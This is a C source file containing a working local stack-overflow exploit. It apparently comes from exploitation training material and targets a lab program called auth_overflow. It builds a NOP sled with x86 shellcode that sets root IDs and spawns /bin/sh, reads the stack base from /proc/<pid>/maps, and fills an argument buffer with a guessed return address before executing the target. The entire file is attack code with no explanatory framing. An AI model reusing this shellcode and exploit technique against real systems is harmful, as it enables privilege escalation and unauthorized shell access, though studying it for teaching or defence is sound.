#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// This shellcode gives access to shell.
char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51"
  "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd"
  "\x80";

// getbaseaddr gets the base of the stack from /proc/<pid>/maps.
unsigned int getbaseaddr(int pid) {
  char fileName[20];
  memset(fileName, 0, 20);
  snprintf(fileName, 20, "/proc/%d/maps", pid);

  FILE *fp = fopen(fileName, "r");
  if (fp == NULL) {
    exit(1);
  }

  char *line = NULL;
  size_t len = 0;
  char *addr = (char*)malloc(100);
  int found = 0;
  while (getline(&line, &len, fp) != -1 && !found) {
    char *token;
    token = strsep(&line, " ");
    memset(addr, 0, 100);
    strcat(addr, token);
    while ((token = strsep(&line, " ")) != NULL) {
      if (strcmp(token, "[stack]") == 0) {
        found = 1;
      }
    }
  }

  char *sbaseaddr;
  strsep(&addr, "-");
  sbaseaddr = strsep(&addr, "-");
  unsigned int baseaddr = (unsigned int)strtoul(sbaseaddr, NULL, 16);  
  free(addr);

  return baseaddr;
}

int main(int argc, char *argv[]) {
  char *env[2] = {0, 0};
  unsigned int i, ret, offset = 200;
  char *sleddedshell, *buffer;
  int sleddedshellsize = 500;

  sleddedshell = (char *)malloc(sleddedshellsize);
  // Fill the sleddedshell buffer with NOPs to create a NOP sled.
  memset(sleddedshell, 0x90, 500);
  // Copy the shellcode at the end of the sleddedshell buffer.
  memcpy(sleddedshell + sleddedshellsize - (sizeof(shellcode) - 1), shellcode,
	 sizeof(shellcode) - 1);
  // Fill the environment variables with only one variable, the shellcode.
  env[0] = sleddedshell;

  // Read the new offset if provided.
  if (argc > 1)
    offset = atoi(argv[1]);

  buffer = (char *)malloc(160);

  // Calculate the return address using the base of the stack and the offset.
  ret = getbaseaddr(getpid()) - offset;

  // Fill the buffer with the return address.
  for (i = 0; i < 160; i += 4)
    *((unsigned int *)(buffer + i)) = ret;

  // Execute the vulnerable code using execle with the created environment.
  execle("./auth_overflow", "auth_overflow", buffer, (char *)NULL, env);
  free(buffer);
  free(sleddedshell);
}
